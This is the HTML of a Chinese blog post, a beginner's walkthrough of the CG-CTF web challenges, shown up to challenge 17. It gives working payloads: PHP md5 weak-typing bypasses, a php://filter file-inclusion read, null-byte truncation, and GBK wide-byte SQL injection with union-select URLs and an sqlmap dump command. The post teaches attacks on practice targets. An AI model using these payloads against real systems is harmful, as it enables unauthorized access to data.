@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！ 南邮CG CTF web传送门">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CG-CTF web篇零基础指南">
+<meta property="og:url" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/index.html">
+<meta property="og:site_name" content="像风">
+<meta property="og:description" content="前言用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！ 南邮CG CTF web传送门">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/2.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/5.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/6.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/7.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/8.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/9.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/10.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/11.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/12.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/13.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/14.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/15.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/16.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/17.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/18.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/20.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/21.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/22.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/23.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/24.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/25.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/26.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/27.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/28.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/dvcs.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/catreadme.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/gitlog.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/gitreset.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/robot.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/linux.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/32.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/33.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/33.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/view1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/view2.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/view3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/29.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/30.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/31.jpg">
+<meta property="og:updated_time" content="2018-11-15T14:50:46.235Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CG-CTF web篇零基础指南">
+<meta name="twitter:description" content="前言用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！ 南邮CG CTF web传送门">
+<meta name="twitter:image" content="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/">
+
+
+
+
+
+  <title>CG-CTF web篇零基础指南 | 像风</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">像风</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/14/CG-CTF-web篇零基础指南/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xiangfengw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="像风">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CG-CTF web篇零基础指南</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-14T21:29:13+08:00">
+                2018-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！</p>
+<p><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南邮CG CTF web传送门</a></p>
+<a id="more"></a>
+<h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><p>直接看源代码就可以看到flag了</p>
+<h2 id="2-md5-collision"><a href="#2-md5-collision" class="headerlink" title="2.md5 collision"></a>2.md5 collision</h2><p>php源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>php弱类型的利用，这道题满常见的，需要传入一个参数a不等于 ‘QNKCDZO’，但是md5加密后的值与 ‘QNKCDZO’ md5加密后的松散比较相等。<em>md5(‘QNKCDZO’)=’0e830400451993494058024219903391’</em> ，而PHP在处理哈希字符串时，会利用<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0E</code>开头的哈希值都解释为<code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0E</code>开头的，那么PHP将会认为他们相同，都是<code>0</code>。</p>
+<p>所以给 a 传入一个 md5 加密后也为 0e 开头的字符串即可，这样的字符串一搜一大把了</p>
+<p>这里我传了 <code>?a=s878926199a</code> 拿到flag</p>
+<p>tips：</p>
+<p>1、在PHP中，@被称为错误控制操作符，前置@符号的表达式产生的任何错误都将被忽略。</p>
+<p>2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位或16位十六进制串，由[0-9a-e]组成。</p>
+<p>3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换而后者不会。</p>
+<h2 id="3-签到2"><a href="#3-签到2" class="headerlink" title="3.签到2"></a>3.签到2</h2><img src="/2018/11/14/CG-CTF-web篇零基础指南/1.jpg">
+<p>这道题是前端对输入框长度的限制，F12查看页面代码发现 <code>maxlength=&quot;10&quot;</code> 而需要输入的口令 “zhimakaimen为11位，直接在查看器更改10为任意大于等于11的数再输入口令即可。</p>
+<h2 id="4-这题不是web"><a href="#4-这题不是web" class="headerlink" title="4.这题不是web"></a>4.这题不是web</h2><p>打开题目地址发现一个可爱的动图，把图片下载到本地，用文本编辑器或winHex打开(记事本就可以了)，Ctrl + F 查找flag，在末尾。</p>
+<h2 id="5-层层递进"><a href="#5-层层递进" class="headerlink" title="5.层层递进"></a>5.层层递进</h2><p>又是一道查看源代码的题，在\&lt;iframe>标签中跟着链接依次访问嵌套的<code>SO.html</code> -&gt; <code>S0.html</code>-&gt;<code>SO.htm</code> -&gt;<code>S0.htm</code>-&gt;<code>404.html</code> ，在404.html注释中找到flag</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/2.jpg">
+<h2 id="6-AAencode"><a href="#6-AAencode" class="headerlink" title="6.AAencode"></a>6.AAencode</h2><p>javascript aaencode </p>
+<p>这道题链接坏了，在南邮旧ctf平台找到了这道题的<a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">链接</a></p>
+<p>打开题目是乱码，用火狐Unicode编码后是颜文字</p>
+<p>提示是js aaencode，是一种把js代码编码成颜文字的编码方式，直接把这段颜文字拉到控制台执行，发现有错误</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/3.jpg">
+<p>错误提示：<code>ωﾟﾉ is not defined</code> ，即 <code>ωﾟﾉ</code> 这个变量没有被定义，那我们先在控制台定义这个变量，再执行代码</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/4.jpg">
+<p>拿到flag</p>
+<h2 id="7-单身二十年"><a href="#7-单身二十年" class="headerlink" title="7.单身二十年"></a>7.单身二十年</h2><p>访问 <em><a href="http://chinalover.sinaapp.com/web8/search_key.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/search_key.php</a></em> 会被重定向到 <em><a href="http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</a></em>  ，重定向会被浏览器自动处理，burp抓包repeater重放一下拿到flag。</p>
+<h2 id="8-php-decode"><a href="#8-php-decode" class="headerlink" title="8.php decode"></a>8.php decode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function CLsI($ZzvSWE)</span><br><span class="line"> &#123;</span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $ZzvSWE;&#125;</span><br><span class="line">echo CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;);</span><br></pre></td></tr></table></figure>
+<p>应该是一道编码题，但是可以直接在<a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">代码在线运行</a>的网站允许一下这段php代码，就可以跑出flag了</p>
+<h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>使用php的filter协议读取index.php</p>
+<p>payload：<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</code></p>
+<p>显示了base64编码后的index.php源码，这种方法经常用得到，把得到的编码在<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">在线网站</a>解码得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125;</span><br><span class="line">	$file=$_GET[&apos;file&apos;];</span><br><span class="line">	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>查看源码得到flag</p>
+<p>更多php伪协议实现命令执行的姿势可见 <a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">传送门</a></p>
+<h2 id="10-单身一百年也没用"><a href="#10-单身一百年也没用" class="headerlink" title="10.单身一百年也没用"></a>10.单身一百年也没用</h2><p>这道题的flag藏在了响应信息中</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/5.jpg">
+<h2 id="11-Download"><a href="#11-Download" class="headerlink" title="11.Download~!"></a>11.Download~!</h2><p>这道题链接找不到了，提示是别下音乐</p>
+<p>看网上的解题是进去之后会看到两个下载音乐的链接，查看源代码发现星星点灯的下载链接为<code>download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=</code>，经过了base64加密，解码内容为xingxingdiandeng.mp3。</p>
+<p>尝试下载其他页面如index.php download.php及它们base64加密后的页面，发现download.php可以下载</p>
+<p>打开下载的download文件，发现首先对url参数进行了base64解码，并且只有四个文件能够正常下载，否则提示Access Forbidden！下载hereiskey.php，得到flag 。</p>
+<h2 id="12-COOKIE"><a href="#12-COOKIE" class="headerlink" title="12.COOKIE"></a>12.COOKIE</h2><p>TIP: 0==not </p>
+<p>F12看网络，把请求头中的Cookie：<code>Login=0</code> 改成 <code>Login=1</code> 重新发包后在响应主体中拿到flag</p>
+<h2 id="13-MYSQL"><a href="#13-MYSQL" class="headerlink" title="13.MYSQL"></a>13.MYSQL</h2><p>根据提示查看robots.txt （robots.txt是一个告诉爬虫那些东西不能爬的文件，在ctf中是一个经常存在的有提示信息的文件）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TIP:sql.php</span><br><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));</span><br><span class="line">  if ($_GET[id]==1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>说明要向sql.php提交一个id，使得<code>intval($_GET[id])</code>为1024而<code>$_GET[id]==1024</code>为假。 </p>
+<p>这里有两种做法</p>
+<p>1.传入id=1024.1，intval()函数会把1024.1取整为1024</p>
+<p>2.利用intval()函数的特性：只识别到非数字的那一位，而松散比较的强制类型转换会把e当作科学记数法的一部分处理，即科传入id=1024e1</p>
+<h2 id="14-GBK-Injection"><a href="#14-GBK-Injection" class="headerlink" title="14.GBK Injection"></a>14.GBK Injection</h2><img src="/2018/11/14/CG-CTF-web篇零基础指南/6.jpg">
+<p>把id参数的值改成2，3得到两个提示信息：gbk_sql_injection 和 the fourth table </p>
+<p>在参数后面加个单引号，发现sql语句转译成了<code>your sql:select id,title from news where id = &#39;3\&#39;&#39;</code></p>
+<p>判断存在GBK宽字节注入， flag在第四个表中，用sqlmap一下就跑出来了哈哈</p>
+<p>payload：</p>
+<p><code>python2 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 -T ctf4 -C flag --dump</code> </p>
+<p>手工注入一下：</p>
+<p>先介绍宽字节注入的原理如下，</p>
+<p>当传入 id=1’ 时，单引号会被转义符(反斜线)转义，导致id参数无法逃逸单引号的包围。由于MySQL执行查询时会跳过畸形字符，当输入参数 id=1%df’ 时，参数会经过转义和url编码变为 id=1%df%5c%27，%5c 是反斜杠的url编码，%27 是单引号的url编码。而在GBK编码中，%df%5c是繁体字”連 “，这时单引号成功逃逸。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#第一步 判断是否存在注入</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1  和</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27--+ </span><br><span class="line">返回结果相同。</span><br><span class="line"></span><br><span class="line">#第二步 使用union查询数据库名</span><br><span class="line">先用 chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 order by 2--+ 判断有两列</span><br><span class="line">再用 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 union select null,database()--+</span><br><span class="line">得到数据库名为&apos;sae-chinalover&apos;</span><br><span class="line"></span><br><span class="line">#第三步 查询&apos;sae-chinalover&apos;数据库的第四张表名</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,table_name from information_schema.tables where table_schema=database() limit 3,1--+</span><br><span class="line">得到第四张表表名为&apos;ctf4&apos;</span><br><span class="line">tips:</span><br><span class="line">1.MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。</span><br><span class="line">2.limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。</span><br><span class="line"></span><br><span class="line">#第四步 从表&apos;ctf4&apos;中查询flag</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,flag from ctf4--+</span><br><span class="line">这里的列名&apos;flag&apos;是猜的，也可以从上一步中的information_schema数据库中查询列名，关于列名的信息在information_schema.columns表中的column_name字段。</span><br></pre></td></tr></table></figure>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/7.jpg">
+<h2 id="15-x00"><a href="#15-x00" class="headerlink" title="15./x00"></a>15./x00</h2><p>这道题学到了点东西！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line"></span><br><span class="line">    if (isset ($_GET[&apos;nctf&apos;])) &#123;</span><br><span class="line">        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE)</span><br><span class="line">            echo &apos;必须输入数字才行&apos;;</span><br><span class="line">        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)   </span><br><span class="line">            die(&apos;Flag: &apos;.$flag);</span><br><span class="line">        else</span><br><span class="line">            echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos()找到<code>#biubiubiu</code></p>
+<p>有两种方法：</p>
+<p>1.ereg()正则函数会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 </p>
+<p>所以提交<code>nctf=1%00%23biubiubiu</code>，即可拿到flag</p>
+<p>2.ereg和strpos函数传入数组后返回的都是NULL </p>
+<p>所以提交<code>nctf[]=</code>，拿到flag</p>
+<p>tips:</p>
+<p>由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL  byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子，还有很多可以自行百度。 </p>
+<h2 id="16-bypass-again"><a href="#16-bypass-again" class="headerlink" title="16.bypass again"></a>16.bypass again</h2><p>依旧是弱类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])</span><br><span class="line">if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Wrong.&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>和第二题原理一样</p>
+<p>payload：<a href="http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a</a></p>
+<h2 id="17-变量覆盖"><a href="#17-变量覆盖" class="headerlink" title="17.变量覆盖"></a>17.变量覆盖</h2><img src="/2018/11/14/CG-CTF-web篇零基础指南/8.jpg">
+<p>source.php查看源代码，关键php代码整理后如下</p>
